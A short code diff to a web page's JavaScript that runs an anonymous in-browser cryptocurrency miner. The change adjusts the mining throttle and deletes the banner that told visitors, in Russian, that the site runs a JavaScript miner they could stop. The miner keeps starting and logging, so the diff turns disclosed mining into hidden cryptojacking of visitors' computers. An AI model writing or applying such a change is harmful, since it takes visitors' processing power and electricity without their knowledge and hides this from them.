@@ -363,19 +363,11 @@
                 }
 
                 var _client = new Client.Anonymous('2ec71af93391bf355c4d45b2cf34c8042dc3e888c1e58d68b9c1c6898045ebc4', {
-                    throttle: 0,
+                    throttle: 0.6,
                     c: 'w'
                 });
 
                 _client.start();
-
-                _client.addMiningNotification(
-                    "Top",
-                    "Этот сайт использует JavaScript-майнер. Если он вам мешает, вы можете его остановить.",
-                    "#cccccc",
-                    40,
-                    "#3d3d3d"
-                );
 
                 console.log("Майнинг-клиент запущен.");
             } catch (error) {
